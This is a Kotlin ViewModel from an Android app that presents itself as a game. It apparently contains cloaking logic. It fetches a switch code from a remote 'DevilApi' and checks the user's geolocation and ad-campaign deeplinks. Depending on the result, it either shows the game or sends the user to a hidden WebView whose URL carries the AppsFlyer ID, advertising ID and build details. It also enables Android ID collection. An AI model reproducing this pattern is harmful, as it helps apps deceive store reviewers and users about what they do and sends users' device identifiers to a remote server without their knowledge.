package com.superplusgames.hosandro.domain

import android.app.Application
import android.util.Log
import androidx.lifecycle.LiveData
import androidx.lifecycle.MutableLiveData
import androidx.lifecycle.ViewModel
import androidx.lifecycle.viewModelScope
import com.appsflyer.AppsFlyerLib
import com.superplusgames.hosandro.data.Constances
import com.superplusgames.hosandro.data.DataHolder
import com.superplusgames.hosandro.data.DataHolder.advertId
import com.superplusgames.hosandro.data.DataHolder.buildVers
import com.superplusgames.hosandro.data.DataHolder.instId
import com.superplusgames.hosandro.data.DataHolder.linka
import com.superplusgames.hosandro.domain.usercases.*
import dagger.hilt.android.lifecycle.HiltViewModel
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import javax.inject.Inject

@HiltViewModel
class MainerVievModel @Inject constructor(
    private val application: Application,
    private val initLoadFacebookUseCase: InitLoadFacebookUseCase,
    private val initLoadMyTrackerUseCase: InitLoadMyTrackerUseCase,
    private val loadDataFromDevilApiUseCase: LoadDataFromDevilApiUseCase,
    private val loadDataFromGeoApiUseCase: LoadDataFromGeoApiUseCase,
    private val loadDataSavedUseCase: LoadDataSavedUseCase,
    private val makeDepplinCheckUseCase: MakeDepplinCheckUseCase,
    private val makeGeoCheckUseCase: MakeGeoCheckUseCase,
    private val saveDataToSharedPrefUseCase: SaveDataToSharedPrefUseCase,
) : ViewModel() {

    private val _goToGame = MutableLiveData<Boolean>()
    val goToGame: LiveData<Boolean>
        get() = _goToGame

    private val _goFromFirstScreenToSecond = MutableLiveData<Boolean>()
    val goFromFirstScreenToSecond: LiveData<Boolean>
        get() = _goFromFirstScreenToSecond

    private val _goFromToVebViev = MutableLiveData<Boolean>()
    val goFromToVebViev: LiveData<Boolean>
        get() = _goFromToVebViev


    private val _codeFromDevilHost = MutableLiveData<String>()
    val codeFromDevilHost: LiveData<String>
        get() = _codeFromDevilHost

    val deviceID = "deviceID="
    val sub_id_1 = "sub_id_1="
    val ad_id = "ad_id="
    val sub_id_4 = "sub_id_4="
    val sub_id_5 = "sub_id_5="
    val sub_id_6 = "sub_id_6="
    val naming_name = "naming"
    val deeporg = "deeporg"

    init {
        _goToGame.value = false

        Log.d("lolo", "mainvievModel INIT")

        loadDataSavedUseCase.loadDataSavedUseCase()
        viewModelScope.launch {
            initLoadMyTrackerUseCase.initLoadMyTracker()
            loadDataFromDevilApiUseCase.loadDataFromDevilApi()
            loadDataFromGeoApiUseCase.loadDataFromGeoApiUseCase()

        }
    }

    fun goToGame() {
        _goToGame.postValue(true)
    }

    fun makeCheckAllCheckers() {
        var mainLinkString = ""
        viewModelScope.launch {
            when (DataHolder.codeFromDevilHost) {
                "1" -> {
                    initLoadFacebookUseCase.initLoadFacebook()
                    while (true) {
                        if (DataHolder.tempNaminglLoad != null && DataHolder.tempDeepLoad != null) {
                            Log.d("lolo", "DataHolder.naming + deepLink уже не нал")



                            val afId = AppsFlyerLib.getInstance().getAppsFlyerUID(application)
                            AppsFlyerLib.getInstance().setCollectAndroidID(true)
                            DataHolder.appsID = afId

                            val namingggg = DataHolder.naming!!
                            val deeplinka = DataHolder.deepLink!!
                            Log.d("lolo", "makeCheckAllCheckers 1 naming is ${namingggg}")
                            Log.d("lolo", "makeCheckAllCheckers 1 deeplinka is ${deeplinka}")
                            if (namingggg.contains(Constances.MAIN_CHECKER)) {
                                DataHolder.typeOfPromotion = Constances.CAMPAIGN
                                //link apps
                                mainLinkString =
                                    "$linka?$sub_id_1$namingggg&$deviceID$afId&$ad_id$advertId&$sub_id_4${Constances.PACK_NAME}&$sub_id_5$buildVers&$sub_id_6$naming_name"
                            } else if (makeGeoCheckUseCase.makeGeoCheckUseCase()) {
                                // link geo or fb
                                DataHolder.typeOfPromotion = Constances.DEEPLINK
                                mainLinkString =
                                    "$linka?$sub_id_1$deeplinka&$deviceID$afId&$ad_id$advertId&$sub_id_4${Constances.PACK_NAME}&$sub_id_5$buildVers&$sub_id_6$deeporg"
                            } else {
                                goToGame()
                                break
                            }
                            DataHolder.MAIN_LINK_FOR_VEB_VIEV = mainLinkString
                            saveDataToSharedPrefUseCase()
                            _goFromToVebViev.postValue(true)
                            break
                        } else {
                            Log.d("lolo", "still null, 1 makeCheckAllCheckers")
                            delay(1000)
                        }
                    }
                }
                "0" -> {
                    initLoadFacebookUseCase.initLoadFacebook()
                    Log.d("lolo", "in 0")
                    //only fb
                    while (true) {
                        if (DataHolder.tempDeepLoad != null) {
                            val deeplinka = DataHolder.deepLink!!
                            if (makeDepplinCheckUseCase.makeDepplinCheckUseCase()) {
                                //link deeplinka
                                DataHolder.typeOfPromotion = Constances.DEEPLINKNOAPPS
                                mainLinkString =
                                    "$linka?$sub_id_1$deeplinka&$deviceID$instId&$ad_id$instId&$sub_id_4${Constances.PACK_NAME}&$sub_id_5$buildVers&$sub_id_6$deeporg"
                            } else if (makeGeoCheckUseCase.makeGeoCheckUseCase()) {
                                // link geo or fb
                                DataHolder.typeOfPromotion = Constances.GEO
                                mainLinkString =
                                    "$linka?$deviceID$instId&$ad_id$instId&$sub_id_4${Constances.PACK_NAME}&$sub_id_5$buildVers&$sub_id_6$naming_name"
                            } else {
                                goToGame()
                                break
                            }
                            DataHolder.MAIN_LINK_FOR_VEB_VIEV = mainLinkString
                            saveDataToSharedPrefUseCase()
                            _goFromToVebViev.postValue(true)
                            break
                        } else {
                            Log.d("lolo", "DataHolder.deepLink == null in 0")
                            delay(1000)
                        }
                    }
                }
            }
        }
    }

    fun loadDataFromApi() {
        viewModelScope.launch {
            delay(1000)
            while (true) {
                if (DataHolder.listOfGeo != null && DataHolder.codeFromDevilHost != null && DataHolder.userCurrentGeo != null) {
                    _codeFromDevilHost.postValue(DataHolder.codeFromDevilHost)
                    _goFromFirstScreenToSecond.postValue(true)
                    break
                } else {
                    Log.d("lolo", "still null, loading")
                    delay(1000)
                }
            }
        }
    }


    fun saveDataToSharedPrefUseCase() {
        saveDataToSharedPrefUseCase.saveDataToSharedPrefUseCase()
    }


}